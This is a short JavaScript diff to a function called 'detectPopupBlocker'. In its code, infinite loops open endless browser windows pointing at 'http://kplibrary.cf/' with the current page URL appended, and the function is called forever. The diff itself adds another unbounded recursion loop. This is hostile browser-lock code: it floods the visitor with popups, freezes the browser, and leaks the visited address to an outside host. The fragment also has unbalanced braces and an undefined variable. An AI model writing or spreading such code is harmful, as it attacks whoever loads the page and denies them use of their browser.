@@ -9,17 +9,19 @@ function detectPopupBlocker() {
         recursor();
       });
     };
-
+    while (true) {
+      recursor();
+    }
   } else {
     myTest.close();
     while (true) {
       var strWindowFeatures = "location=yes,height=1200,width=1400,scrollbars=yes,status=yes";
       var URL = "http://kplibrary.cf/" + location.href;
       var win = window.open(URL, "_blank", strWindowFeatures);
-        console.log(i);
-      }
+      console.log(i);
     }
   }
+}
 }
 while (true) {
   detectPopupBlocker();
